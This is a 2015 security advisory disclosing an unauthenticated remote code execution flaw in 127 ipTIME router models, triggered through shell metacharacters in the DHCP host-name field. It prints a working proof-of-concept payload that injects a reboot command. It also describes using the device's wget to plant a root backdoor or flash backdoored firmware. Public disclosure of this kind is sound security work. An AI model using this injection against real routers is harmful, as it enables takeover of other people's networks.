## Advisory Information

Title: 127 ipTIME router models vulnerable to an unauthenticated RCE
by sending a crafted DHCP request
Advisory URL: https://pierrekim.github.io/advisories/2015-iptime-0x02.txt
Blog URL: https://pierrekim.github.io/blog/2015-07-06-127-iptime-router-models-unauthenticated-RCE-with-DHCP.html
Date published: 2015-07-06
Vendors contacted: None
Release mode: Released, 0day
CVE: no current CVE



## Product Description

EFMNetworks ipTIME is the largest Korean brand of SOHO/small/middle
entreprise Routers/WiFi APs/Modems/Firewalls in South Korea
with millions of devices deployed in the country. EFMNetworks ipTIME
is occupying more than 60 percent of personal network devices.
There are =~ 10 000 000 of ipTIME devices deployed in South Korea.



## Vulnerability Summary

This vulnerability allows to bypass the admin authentication and to
get a direct RCE from the LAN side with a single DHCP request.

This is a direct RCE against the routers which gives a complete root
access to the embedded Linux from the LAN side.

It affects 127 ipTIME products from 2009-era firmwares to the current
firwmare (9.66, built time 2015-06-11) with the default configuration:

  - ipTIME v504
  - ipTIME wre1
  - ipTIME x3003
  - ipTIME x3007
  - ipTIME x5007
  - ipTIME x6003


The probability that firmware 9.68 (last firmware for these specific
models) running in the below products is vulnerable is VERY high:


  - ipTIME q304
  - ipTIME q1
  - ipTIME q504
  - ipTIME ew302
  - ipTIME n702bcm
  - ipTIME a3004ns
  - ipTIME a5004ns


Concerning the high CVSS score (10/10) of the vulnerability, the
number of affected devices and the longevity of this vulnerability (6+
year old),
the ipTIME users are urged to contact ipTIME.



## Details

This vulnerability is the exact inverse of CVE-2011-0997. The DHCPD
server in ipTIME devices allows remote attackers to execute arbitrary
commands
via shell metacharacters in the host-name field.

Sending a DHCP request with this parameter will reboot the device:

cat /etc/dhcp/dhclient.conf

  send host-name ";/sbin/reboot";

When connecting to the UART port (`screen /dev/ttyUSB0 38400`), we
will see the stdout of the /dev/console device;
the dhcp request will immediately force the reboot of the remote device:

An attacker can use the /usr/bin/wget binary located in the file
system of the remote device to plant a backdoor and then execute it as
root.

- From my tests, it is possible to use this vulnerability to overwrite
the firmware with a custom (backdoored) firmware.



## Vendor Response

- From my experience, contacting EFMNetworks ipTIME proved to be useless.
They don't publish security information in the changelog, they don't
answer to security researchers and
they don't credit them either.
EFMNetworks ipTIME was not contacted in regard of this case.
